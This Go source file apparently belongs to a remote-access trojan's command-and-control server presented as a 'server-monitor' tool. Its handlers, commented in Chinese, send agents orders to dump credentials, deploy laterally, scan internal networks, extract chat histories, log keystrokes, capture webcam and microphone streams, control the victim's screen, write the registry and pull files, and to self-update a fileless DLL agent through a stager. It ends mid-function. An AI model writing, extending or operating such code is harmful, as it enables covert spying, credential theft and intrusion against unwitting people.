package handler

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"server-monitor/internal/model"
	"server-monitor/internal/service"
	"server-monitor/internal/ws"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

type ExecHandler struct {
	db       *gorm.DB
	agentHub *ws.AgentHub
}

func NewExecHandler(db *gorm.DB, agentHub *ws.AgentHub) *ExecHandler {
	return &ExecHandler{db: db, agentHub: agentHub}
}

type ExecForm struct {
	Command string `json:"command" binding:"required"`
}

// Exec 向指定服务器发送命令并等待结果（支持 SSH 和 Agent 两种方式）
func (h *ExecHandler) Exec(c *gin.Context) {
	serverID := c.Param("id")

	var form ExecForm
	if err := c.ShouldBindJSON(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供命令"})
		return
	}

	// 查找服务器
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}

	switch server.ConnectMethod {
	case "ssh", "":
		h.execViaSSH(c, server, form.Command)
	case "agent", "plugin":
		h.execViaAgent(c, server, form.Command)
	default:
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "不支持的连接方式: " + server.ConnectMethod})
	}
}

// execViaSSH 通过 SSH 执行命令
func (h *ExecHandler) execViaSSH(c *gin.Context, server model.Server, command string) {
	client := service.NewSSHClient(
		server.Host, server.Port,
		server.Username, server.AuthType, server.AuthValue,
		10*time.Second,
	)

	output, err := client.Run(command)
	result := gin.H{
		"exitCode": 0,
		"output":   output,
		"error":    "",
	}
	if err != nil {
		result["error"] = err.Error()
		result["exitCode"] = 1
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "data": result})
}

// execViaAgent 通过 Agent WebSocket 执行命令
func (h *ExecHandler) execViaAgent(c *gin.Context, server model.Server, command string) {
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	result, err := h.agentHub.ExecCommand(server.ID, command, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "data": result})
}

// QuickCmd 向指定服务器的 Agent 发送快捷指令
func (h *ExecHandler) QuickCmd(c *gin.Context) {
	serverID := c.Param("id")

	var form struct {
		Cmd string `json:"cmd" binding:"required"`
	}
	if err := c.ShouldBindJSON(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供指令"})
		return
	}

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}

	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	result, err := h.agentHub.QuickCmd(server.ID, form.Cmd, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "data": gin.H{
		"message": result.Output,
		"error":   result.Error,
		"ok":      result.Error == "",
	}})
}

// AgentStatus 获取远程执行是否可用
func (h *ExecHandler) AgentStatus(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusOK, gin.H{"success": true, "data": gin.H{"online": false}})
		return
	}

	switch server.ConnectMethod {
	case "ssh", "":
		// SSH 服务器只要有配置就认为可用（实际连接时再判断）
		c.JSON(http.StatusOK, gin.H{"success": true, "data": gin.H{"online": server.Host != "" && server.IsActive}})
	case "agent", "plugin":
		c.JSON(http.StatusOK, gin.H{"success": true, "data": gin.H{"online": h.agentHub.IsAgentOnline(serverID)}})
	default:
		c.JSON(http.StatusOK, gin.H{"success": true, "data": gin.H{"online": false}})
	}
}

// NetScan 向指定 Agent 发送内网扫描命令
func (h *ExecHandler) NetScan(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		params = []byte("{}")
	}

	result, err := h.agentHub.NetScan(server.ID, params, 120*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	// result 是原始 JSON 字符串，直接嵌入
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// LateralDeploy 向指定 Agent 发送横向部署命令
func (h *ExecHandler) LateralDeploy(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供部署参数"})
		return
	}

	result, err := h.agentHub.LateralDeploy(server.ID, params, 60*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// CredDump 向指定 Agent 发送凭证窃取命令
func (h *ExecHandler) CredDump(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		params = []byte(`{"method":"all"}`)
	}

	result, err := h.agentHub.CredDump(server.ID, params, 120*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// ChatDump 向指定 Agent 发送社交软件聊天记录提取命令
func (h *ExecHandler) ChatDump(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	result, err := h.agentHub.ChatDump(server.ID, json.RawMessage("{}"), 150*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// FileBrowse 向指定 Agent 发送文件浏览命令
func (h *ExecHandler) FileBrowse(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		params = []byte("{}")
	}

	result, err := h.agentHub.FileBrowse(server.ID, params, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// FileDownload 向指定 Agent 发送文件下载命令
func (h *ExecHandler) FileDownload(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供文件路径"})
		return
	}

	result, err := h.agentHub.FileDownload(server.ID, params, 300*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// WebcamSnap 向指定 Agent 发送摄像头拍照命令
func (h *ExecHandler) WebcamSnap(c *gin.Context) {
	serverID := c.Param("id")

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		params = []byte("{}")
	}

	result, err := h.agentHub.WebcamSnap(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// ForceUpdateCS 强制更新 C# 无文件 Agent：向指定或所有 Windows Agent 发送 self_update 命令
// Agent 收到后会重新拉取最新 DLL 并重启
func (h *ExecHandler) ForceUpdateCS(c *gin.Context) {
	serverID := c.Param("id")

	// 构造服务器外部地址，供 Agent 拉取新 stager
	stagerBaseURL := fmt.Sprintf("https://%s", c.Request.Host)
	if c.Request.TLS == nil {
		stagerBaseURL = fmt.Sprintf("http://%s", c.Request.Host)
	}

	// 如果 id == "all"，向所有在线 Windows Agent 推送
	if serverID == "all" {
		sent := h.agentHub.SelfUpdateAll(stagerBaseURL)
		c.JSON(http.StatusOK, gin.H{"success": true, "message": fmt.Sprintf("已向 %d 个在线 Windows Agent 发送更新指令", sent)})
		return
	}

	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}

	if err := h.agentHub.SelfUpdate(server.ID, stagerBaseURL); err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"success": true, "message": "自更新指令已发送，Agent 将在数秒内重启并加载最新 DLL"})
}

// ProcessList 获取远程进程列表
func (h *ExecHandler) ProcessList(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.ProcessList(server.ID, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// ProcessKill 结束远程进程
func (h *ExecHandler) ProcessKill(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供 PID"})
		return
	}
	result, err := h.agentHub.ProcessKill(server.ID, params, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// WindowList 获取远程窗口列表
func (h *ExecHandler) WindowList(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.WindowList(server.ID, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// WindowControl 控制远程窗口
func (h *ExecHandler) WindowControl(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供窗口参数"})
		return
	}
	result, err := h.agentHub.WindowControl(server.ID, params, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// ServiceList 获取远程服务列表
func (h *ExecHandler) ServiceList(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.ServiceList(server.ID, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// ServiceControl 控制远程服务
func (h *ExecHandler) ServiceControl(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供服务参数"})
		return
	}
	result, err := h.agentHub.ServiceControl(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// KeylogStart 启动键盘记录
func (h *ExecHandler) KeylogStart(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.KeylogStart(server.ID, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// KeylogStop 停止键盘记录
func (h *ExecHandler) KeylogStop(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.KeylogStop(server.ID, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// KeylogDump 获取键盘记录数据
func (h *ExecHandler) KeylogDump(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.KeylogDump(server.ID, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// WebcamStreamStart 启动实时摄像头流
func (h *ExecHandler) WebcamStreamStart(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.WebcamStart(server.ID, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// WebcamStreamStop 停止实时摄像头流
func (h *ExecHandler) WebcamStreamStop(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.WebcamStop(server.ID, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// WebcamLatestFrame 获取最新摄像头帧
func (h *ExecHandler) WebcamLatestFrame(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	frame, err := h.agentHub.WebcamLatestFrame(server.ID)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"success": true, "data": nil})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+frame+`}`))
}

// MicStreamStart 启动实时麦克风监听
func (h *ExecHandler) MicStreamStart(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.MicStart(server.ID, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// MicStreamStop 停止实时麦克风监听
func (h *ExecHandler) MicStreamStop(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	result, err := h.agentHub.MicStop(server.ID, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// MicLatestFrame 获取最新麦克风音频帧
func (h *ExecHandler) MicLatestFrame(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	frame, err := h.agentHub.MicLatestFrame(server.ID)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"success": true, "data": nil})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+frame+`}`))
}

// FileChunkUpload 接收 Agent 上传的文件分片
// POST /api/agent/file-chunk
func (h *ExecHandler) FileChunkUpload(c *gin.Context) {
	downloadID := c.GetHeader("X-Download-ID")
	chunkIdx := c.GetHeader("X-Chunk-Index")
	totalStr := c.GetHeader("X-Total-Chunks")
	fileName := c.GetHeader("X-File-Name")
	if downloadID == "" || chunkIdx == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "missing headers"})
		return
	}

	dir := filepath.Join("data", "downloads", downloadID)
	os.MkdirAll(dir, 0755)

	// 保存 chunk
	chunkPath := filepath.Join(dir, fmt.Sprintf("chunk_%s", chunkIdx))
	f, err := os.Create(chunkPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer f.Close()
	io.Copy(f, c.Request.Body)

	// 保存元数据（仅第一个 chunk 写入）
	metaPath := filepath.Join(dir, "meta.txt")
	if _, err := os.Stat(metaPath); os.IsNotExist(err) {
		os.WriteFile(metaPath, []byte(fmt.Sprintf("%s\n%s", fileName, totalStr)), 0644)
	}

	c.JSON(http.StatusOK, gin.H{"ok": true})
}

// FileDownloadServe 提供已上传分片的文件下载
// GET /api/downloads/:id
func (h *ExecHandler) FileDownloadServe(c *gin.Context) {
	downloadID := c.Param("id")
	dir := filepath.Join("data", "downloads", downloadID)

	metaPath := filepath.Join(dir, "meta.txt")
	metaBytes, err := os.ReadFile(metaPath)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "download not found"})
		return
	}
	var fileName string
	var totalChunks int
	if len(string(metaBytes)) > 0 {
		parts := splitLines(string(metaBytes))
		if len(parts) >= 1 {
			fileName = parts[0]
		}
		if len(parts) >= 2 {
			totalChunks, _ = strconv.Atoi(parts[1])
		}
	}
	if fileName == "" {
		fileName = "download"
	}

	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fileName))
	c.Header("Content-Type", "application/octet-stream")

	// 按顺序流式写出所有 chunk
	for i := 0; i < totalChunks; i++ {
		chunkPath := filepath.Join(dir, fmt.Sprintf("chunk_%d", i))
		f, err := os.Open(chunkPath)
		if err != nil {
			break
		}
		io.Copy(c.Writer, f)
		f.Close()
	}

	// 清理临时文件（异步）
	go func() {
		time.Sleep(30 * time.Second)
		os.RemoveAll(dir)
	}()
}

func splitLines(s string) []string {
	var lines []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '\n' {
			lines = append(lines, s[start:i])
			start = i + 1
		}
	}
	if start < len(s) {
		lines = append(lines, s[start:])
	}
	return lines
}

// ── 新增 DLL 功能 HTTP 处理函数 ──

// ScreenInput 向远程桌面发送鼠标/键盘输入
func (h *ExecHandler) ScreenInput(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供输入参数"})
		return
	}
	result, err := h.agentHub.ScreenInput(server.ID, params, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// FileUploadToAgent 上传小文件到目标（单次 base64）
func (h *ExecHandler) FileUploadToAgent(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供上传参数"})
		return
	}
	result, err := h.agentHub.FileUpload(server.ID, params, 60*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// FileUploadStartToAgent 发起分块上传
func (h *ExecHandler) FileUploadStartToAgent(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供参数"})
		return
	}
	result, err := h.agentHub.FileUploadStart(server.ID, params, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// FileUploadChunkToAgent 发送文件分块
func (h *ExecHandler) FileUploadChunkToAgent(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "请提供分块数据"})
		return
	}
	result, err := h.agentHub.FileUploadChunk(server.ID, params, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// RegBrowse 浏览远程注册表
func (h *ExecHandler) RegBrowse(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
	if err := c.ShouldBindJSON(&params); err != nil {
		params = []byte("{}")
	}
	result, err := h.agentHub.RegBrowse(server.ID, params, 15*time.Second)
	if err != nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.Data(http.StatusOK, "application/json", []byte(`{"success":true,"data":`+result+`}`))
}

// RegWrite 写入远程注册表
func (h *ExecHandler) RegWrite(c *gin.Context) {
	serverID := c.Param("id")
	var server model.Server
	if err := h.db.First(&server, "id = ?", serverID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "服务器不存在"})
		return
	}
	if !h.agentHub.IsAgentOnline(server.ID) {
		c.JSON(http.StatusServiceUnavailable, gin.H{"success": false, "error": "Agent 不在线"})
		return
	}
	var params json.RawMessage
